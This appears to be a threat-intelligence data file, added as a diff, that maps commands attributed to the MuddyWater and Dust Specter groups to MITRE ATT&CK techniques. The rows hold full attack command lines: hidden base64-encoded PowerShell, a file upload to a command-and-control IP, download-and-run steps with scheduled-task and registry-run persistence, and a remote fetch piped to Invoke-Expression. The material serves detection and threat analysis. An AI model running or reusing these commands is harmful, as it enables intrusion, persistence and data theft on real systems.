+MuddyWater,PowerShell,execution,T1059.001,PowerShell,powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -EncodedCommand dwBrAG4AbABoAGEAOwAkAHcAawBuAGwAaABhAD0AIgB3AGsAbgBsAGgAYQAiADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAHMAaAAuAGUAeABlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgA=
+MuddyWater,PowerShell,defense-evasion,T1027.010,Command Obfuscation,powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -EncodedCommand dwBrAG4AbABoAGEAOwAkAHcAawBuAGwAaABhAD0AIgB3AGsAbgBsAGgAYQAiADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAHMAaAAuAGUAeABlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgA=
+MuddyWater,PowerShell,defense-evasion,T1564.003,Hidden Window,powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -EncodedCommand dwBrAG4AbABoAGEAOwAkAHcAawBuAGwAaABhAD0AIgB3AGsAbgBsAGgAYQAiADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAHMAaAAuAGUAeABlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgA=
+MuddyWater,PowerShell,execution,T1059.001,PowerShell,powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -EncodedCommand ZgBkAGgAYgBxAHkAcgA7ACQAZgBkAGgAYgBxAHkAcgA9ACIAZgBkAGgAYgBxAHkAcgAiADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAGcAcwBoAGQAbwBjAF8AcgBlAGwAZQBhAHMAZQBfAFgANgA0AF8ARwBVAEkALgBlAHgAZQAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4A
+MuddyWater,PowerShell,defense-evasion,T1027.010,Command Obfuscation,powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -EncodedCommand ZgBkAGgAYgBxAHkAcgA7ACQAZgBkAGgAYgBxAHkAcgA9ACIAZgBkAGgAYgBxAHkAcgAiADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAGcAcwBoAGQAbwBjAF8AcgBlAGwAZQBhAHMAZQBfAFgANgA0AF8ARwBVAEkALgBlAHgAZQAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4A
+MuddyWater,PowerShell,defense-evasion,T1564.003,Hidden Window,powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -EncodedCommand ZgBkAGgAYgBxAHkAcgA7ACQAZgBkAGgAYgBxAHkAcgA9ACIAZgBkAGgAYgBxAHkAcgAiADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAGcAcwBoAGQAbwBjAF8AcgBlAGwAZQBhAHMAZQBfAFgANgA0AF8ARwBVAEkALgBlAHgAZQAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4A
+MuddyWater,Taskkill,execution,T1059.003,Windows Command Shell,taskkill /IM novaservice.exe
+MuddyWater,Taskkill,impact,T1489,Service Stop,taskkill /IM novaservice.exe
+MuddyWater,Cmd,execution,T1059.003,Windows Command Shell,taskkill /IM novaservice.exe
+MuddyWater,Cmd,impact,T1489,Service Stop,taskkill /IM novaservice.exe
+MuddyWater,Start-Process,execution,T1059.001,PowerShell,Start-Process %ALLUSERSPROFILE%\FMAPP.exe -WindowStyle Hidden
+MuddyWater,Start-Process,defense-evasion,T1564.003,Hidden Window,Start-Process %ALLUSERSPROFILE%\FMAPP.exe -WindowStyle Hidden
+MuddyWater,PowerShell,execution,T1059.001,PowerShell,Start-Process %ALLUSERSPROFILE%\FMAPP.exe -WindowStyle Hidden
+MuddyWater,PowerShell,defense-evasion,T1564.003,Hidden Window,Start-Process %ALLUSERSPROFILE%\FMAPP.exe -WindowStyle Hidden
+MuddyWater,PowerShell,exfiltration,T1041,Exfiltration Over C2 Channel,$wc = New-Object System.Net.WebClient; $wc.UploadFile(“hxxp://143[.]198[.]5[.]41:443/success”“%PUBLIC%\downloads\cobe-notes.txt”);
+MuddyWater,PowerShell,execution,T1059.001,PowerShell,$wc = New-Object System.Net.WebClient; $wc.UploadFile(“hxxp://143[.]198[.]5[.]41:443/success”“%PUBLIC%\downloads\cobe-notes.txt”);
+Dust Specter,exit,execution,T1059.001,PowerShell,$di='%ALLUSERSPROFILE%\WinWebex';md $di 2>;$path=$di+'\WinWebex.exe';Add-Type -A System.Net.Http;$c=New-Object System.Net.Http.HttpClient; $c.DefaultRequestHeaders.UserAgent.ParseAdd('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/137.0.0.0 Safari/537.36 Edg/137.0.0.0');[IO.File]::WriteAllBytes($path $c.GetAsync('https://meetingapp.site/webexdownload').Result.Content.ReadAsByteArrayAsync().Result); $c.Dispose();Register-ScheduledTask -TaskName winWebex -Action (New-ScheduledTaskAction -Execute $path) -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5) -RepetitionInterval (New-TimeSpan -Hours 2) -RepetitionDuration ([TimeSpan]::FromDays(9999))) -Settings (New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Seconds 0)) -Force; Start-ScheduledTask -TaskName winWebex;exit;
+Dust Specter,New-ItemProperty,execution,T1059.001,PowerShell,%ALLUSERSPROFILE%\PolGuid\WingetUI\WingetUI.exe;New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'VLC' -Value '%ALLUSERSPROFILE%\PolGuid\VLC\vlc.exe' -PropertyType String;New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WingetUI' -Value '%ALLUSERSPROFILE%\PolGuid\WingetUI\WingetUI.exe' -PropertyType String;
+MuddyWater,Invoke-Expression,command-and-control,T1071.001,Web Protocols,%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe (Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri http://206.71.149.51:443/57576?filter_relational_operator_2=60169).content | Invoke-Expression
+MuddyWater,Invoke-Expression,command-and-control,T1105,Ingress Tool Transfer,%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe (Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri http://206.71.149.51:443/57576?filter_relational_operator_2=60169).content | Invoke-Expression
+MuddyWater,Invoke-Expression,execution,T1059.001,PowerShell,%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe (Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri http://206.71.149.51:443/57576?filter_relational_operator_2=60169).content | Invoke-Expression
+MuddyWater,PowerShell,command-and-control,T1071.001,Web Protocols,%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe (Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri http://206.71.149.51:443/57576?filter_relational_operator_2=60169).content | Invoke-Expression
+MuddyWater,PowerShell,command-and-control,T1105,Ingress Tool Transfer,%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe (Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri http://206.71.149.51:443/57576?filter_relational_operator_2=60169).content | Invoke-Expression
+MuddyWater,PowerShell,execution,T1059.001,PowerShell,%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe (Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri http://206.71.149.51:443/57576?filter_relational_operator_2=60169).content | Invoke-Expression
+MuddyWater,Invoke-WebRequest,command-and-control,T1071.001,Web Protocols,%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe (Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri http://206.71.149.51:443/57576?filter_relational_operator_2=60169).content | Invoke-Expression
+MuddyWater,Invoke-WebRequest,command-and-control,T1105,Ingress Tool Transfer,%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe (Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri http://206.71.149.51:443/57576?filter_relational_operator_2=60169).content | Invoke-Expression
+MuddyWater,Invoke-WebRequest,execution,T1059.001,PowerShell,%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe (Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri http://206.71.149.51:443/57576?filter_relational_operator_2=60169).content | Invoke-Expression
